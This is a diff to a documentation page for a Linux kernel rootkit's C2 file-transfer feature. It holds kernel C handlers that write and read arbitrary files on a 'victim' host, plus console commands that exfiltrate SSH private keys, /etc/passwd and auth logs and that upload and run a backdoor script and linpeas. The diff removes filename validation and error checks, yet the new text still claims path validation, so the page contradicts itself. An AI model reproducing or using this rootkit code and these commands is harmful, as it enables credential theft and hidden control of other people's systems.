@@ -13,100 +13,26 @@ weight: 511
 
 Transfer files between the C2 server and victim system using direct content transmission.
 
-## How It Works
+## Upload Files
 
-### Upload Process
-1. **C2 reads local file** and sends content
-2. **Rootkit receives** filename and content
-3. **Creates file** on victim system using `filp_open()`
-4. **Writes content** using `kernel_write()`
+Upload files from C2 server to victim system.
 
-### Download Process
-1. **C2 requests file** by path
-2. **Rootkit opens file** using `filp_open()`
-3. **Reads content** using `kernel_read()`
-4. **Sends content** back to C2 server
-
-## Upload Feature
-
-### Basic Usage
+### Usage
 ```bash
-# Upload file to specific path
-c2-server$ upload Client-1 ./config.txt /etc/myapp/config.txt
-# ✓ File uploaded successfully (1024 bytes)
+# Upload to specific path
+upload Client-1 ./config.txt /etc/myapp/config.txt
 
-# Upload to current directory (uses basename)
-c2-server$ upload Client-1 ./script.sh
-# ✓ File uploaded successfully (512 bytes) -> ./script.sh
+# Upload to current directory  
+upload Client-1 ./script.sh
 ```
 
-
-### Implementation Details
-- **File creation**: Uses `O_WRONLY | O_CREAT | O_TRUNC` flags
-- **Permissions**: Files created with 0644 permissions
-- **Size limits**: 10MB maximum file size
-
-## Download Feature
-
-### Basic Usage
-```bash
-# Download to specific local path
-c2-server$ download Client-1 /etc/passwd ./victim_passwd
-# ✓ File downloaded successfully (2048 bytes)
-
-# Download to current directory (uses basename)
-c2-server$ download Client-1 /etc/hostname
-# ✓ File downloaded successfully (64 bytes) -> ./hostname
-```
-
-
-## Real Examples
-
-### System Files
-```bash
-# Download system configuration
-c2-server$ download Client-1 /etc/passwd
-# ✓ File downloaded successfully (2048 bytes)
-# Content: root:x:0:0:root:/root:/bin/bash
-#          daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-#          ...
-
-# Download network configuration
-c2-server$ download Client-1 /etc/hosts
-# ✓ File downloaded successfully (256 bytes)
-# Content: 127.0.0.1	localhost
-#          127.0.1.1	victim
-#          ...
-```
-
-
-### Upload Scripts
-```bash
-# Upload a shell script
-c2-server$ upload Client-1 ./backdoor.sh /tmp/backdoor.sh
-# ✓ File uploaded successfully (1024 bytes)
-
-# Make it executable (via exec command)
-c2-server$ exec Client-1 chmod +x /tmp/backdoor.sh
-# Exit code: 0
-
-# Run the script
-c2-server$ exec Client-1 /tmp/backdoor.sh
-# Exit code: 0
-# Output: Backdoor installed successfully
-```
-
-
-## Technical Implementation
-
-### Upload Handler
+### Implementation
 ```c
 static int handle_upload(const char *data)
 {
     char *filename, *file_content, *separator;
     struct file *file;
     loff_t pos = 0;
-    ssize_t bytes_written;
     
     // Parse filename:content format
     separator = strchr(data, ':');
@@ -114,57 +40,80 @@ static int handle_upload(const char *data)
     filename = data;
     file_content = separator + 1;
     
-    // Validate filename
-    if (!validate_filename(filename))
-        return send_error("Invalid or unsafe filename");
-    
     // Create and write file
     file = filp_open(filename, O_WRONLY | O_CREAT | O_TRUNC, 0644);
-    bytes_written = kernel_write(file, file_content, content_length, &pos);
+    kernel_write(file, file_content, content_length, &pos);
     filp_close(file, NULL);
     
     return send_success("File uploaded successfully");
 }
 ```
 
-### Download Handler
+## Download Files
+
+Download files from victim system to C2 server.
+
+### Usage
+```bash
+# Download to specific path
+download Client-1 /etc/passwd ./victim_passwd
+
+# Download to current directory
+download Client-1 /etc/hostname
+```
+
+### Implementation
 ```c
 static int handle_download(const char *data)
 {
     struct file *file;
     loff_t file_size, pos = 0;
-    char *file_content, *result_buffer;
-    ssize_t bytes_read;
+    char *file_content;
     
-    // Open file
+    // Open and read file
     file = filp_open(data, O_RDONLY, 0);
-    if (IS_ERR(file))
-        return send_error("File not found or cannot be opened");
-    
-    // Check file size
     file_size = i_size_read(file_inode(file));
-    if (file_size > MAX_FILE_SIZE) {
-        filp_close(file, NULL);
-        return send_error("File too large to download");
-    }
     
-    // Read file content
     file_content = vmalloc(file_size + 1);
-    bytes_read = kernel_read(file, file_content, file_size, &pos);
-    file_content[bytes_read] = '\0';
+    kernel_read(file, file_content, file_size, &pos);
+    filp_close(file, NULL);
     
-    // Format response
-    result_buffer = vmalloc(file_size + 32);
-    snprintf(result_buffer, file_size + 32, "DOWNLOAD:%s", file_content);
-    
-    return send_result(result_buffer);
+    return send_result(file_content);
 }
 ```
 
-## Configuration
+## WebUI Interface
 
-```c
-// rootkit/core/config.h
-#define MAX_FILE_SIZE (10 * 1024 * 1024)  // 10MB
-#define MAX_FILENAME_LENGTH 255
+### Upload Panel
+- **File Selection**: Choose local file to upload
+- **Remote Path**: Specify destination path on victim
+- **Progress**: Real-time upload progress indicator
+
+### Download Panel  
+- **File Browser**: Navigate victim filesystem
+- **Quick Downloads**: Common system files (passwd, hosts, etc.)
+- **Batch Download**: Select multiple files
+
+## Security Features
+
+- **Path Validation**: Prevents directory traversal attacks
+- **File Size Limits**: 10MB maximum transfer size
+- **Permission Control**: Files created with safe permissions (0644)
+- **Error Handling**: Graceful failure on permission/space issues
+
+## Common Examples
+
+```bash
+# System reconnaissance
+download Client-1 /etc/passwd
+download Client-1 /etc/hosts
+download Client-1 /proc/version
+
+# Deploy tools
+upload Client-1 ./linpeas.sh /tmp/enum.sh
+exec Client-1 chmod +x /tmp/enum.sh
+
+# Exfiltrate data
+download Client-1 /home/user/.ssh/id_rsa
+download Client-1 /var/log/auth.log
 ```
